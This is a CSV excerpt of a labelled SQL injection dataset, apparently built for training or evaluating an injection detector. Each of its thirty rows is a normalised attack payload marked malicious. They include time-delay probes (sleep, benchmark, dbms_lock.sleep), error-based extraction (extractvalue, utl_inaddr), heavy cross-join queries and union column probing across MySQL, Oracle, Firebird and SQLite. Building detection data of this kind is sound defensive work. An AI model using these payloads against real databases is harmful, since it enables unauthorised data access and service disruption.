row_index,payload_norm,label,sqli_type_hint
3360,select ( case when ( 7271 = 1658 ) then 7271 else 7271* ( select 7271 from information_schema.character_sets ) end ) #,1,
3361,1' ) as fksm where 9714 = 9714,1,
3362,"1 where 1153 = 1153 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",1,
3363,1 ) as drgs where 1989 = 1989 order by 1--,1,
3364,"1' and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
3365,"1' ) ) as kwre where 7775 = 7775 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
3366,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( 'qhgp' = 'qhgp",1,
3367,"1' ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( 'blnh' like 'blnh",1,
3368,-1499 ) as gxfm where 9762 = 9762 or 5989 = 4782--,1,
3369,"1"" ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
3370,1'+ ( select 'toec' where 5810 = 5810 and sleep ( 5 ) ) +',1,
3371,"1 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",1,
3372,-4023 or ( 8779 = 5716 ) *5716,1,
3373,1'|| ( select 'eyiy' from dual where 8127 = 8127,1,
3374,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( 'vfxg' like 'vfxg",1,
3375,"1', ( begin if ( 8340 = 8340 ) then dbms_lock.sleep ( 5 )",1,
3376,"1"" ) ) as daqd where 4390 = 4390 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
3377,"-2009%' union all select 1991,1991#",1,
3378,"1' ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( 'fele' = 'fele",1,
3379,"1%' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( '%' = '",1,
3380,1 ) where 2199 = 2199 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,1,
3381,"1' where 4417 = 4417 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1,
3382,"-1620 ) ) union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",1,
3383,"1'+ ( select 'opqr' where 2442 = 2442 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
3384,"1"" and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) )",1,
3385,"1 ) where 9206 = 9206 union all select null,null,null,null,null,null#",1,
3386,"1'+ ( select 'ycsv' where 3628 = 3628 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
3387,"1%"" ) and 7533 = 7533 and ( ""%"" = """,1,
3388,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) # lchh",1,
3389,"1'|| ( select 'uusj' where 2149 = 2149 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) ||'",1,
